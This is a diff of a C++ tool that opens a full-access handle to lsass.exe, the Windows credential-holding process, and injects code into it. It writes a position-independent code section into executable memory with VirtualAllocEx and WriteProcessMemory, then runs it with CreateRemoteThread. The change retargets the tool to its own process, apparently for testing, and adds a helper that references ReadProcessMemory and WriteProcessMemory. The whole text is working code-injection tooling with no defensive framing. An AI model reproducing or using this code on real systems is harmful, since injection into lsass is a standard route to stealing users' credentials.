@@ -12,7 +12,7 @@ public:
 	HANDLE hLsass;
 
 	bool OpenLsass() {
-		this->hLsass = OpenProcess(PROCESS_ALL_ACCESS, false, 14576);
+		this->hLsass = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
 		if (this->hLsass)
 			return true;
 		else
@@ -42,6 +42,11 @@ public:
 	}
 };
 
+void __declspec(noinline) x() {
+	ReadProcessMemory(0, 0, 0, 0, 0);
+	WriteProcessMemory(0, 0, 0, 0, 0);
+}
+
 int main()
 {
 
@@ -52,14 +57,18 @@ int main()
 		printf("Failed to acquire handle on lsass.exe");
 		return 0;
 	}
-
 	iPI->ListLsassModules();
 
  	auto mem = VirtualAllocEx(iPI->hLsass, 0, SIZE_PIC_SECTION, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	
 	WriteProcessMemory(iPI->hLsass, mem, (LPVOID)START_PIC_SECTION, SIZE_PIC_SECTION, 0);
 	auto hThread = CreateRemoteThread(iPI->hLsass, NULL, 2048, (LPTHREAD_START_ROUTINE)((uintptr_t)(mem)+EP), mem, 0, 0);
 	printf("Waiting...\n");
 	WaitForSingleObject(hThread, -1);
+	printf("RPM address : %p\n", &ReadProcessMemory);
+	
+
+	x();
 	CloseHandle(hThread);
 	VirtualFreeEx(iPI->hLsass, mem, 0, MEM_RELEASE);
 
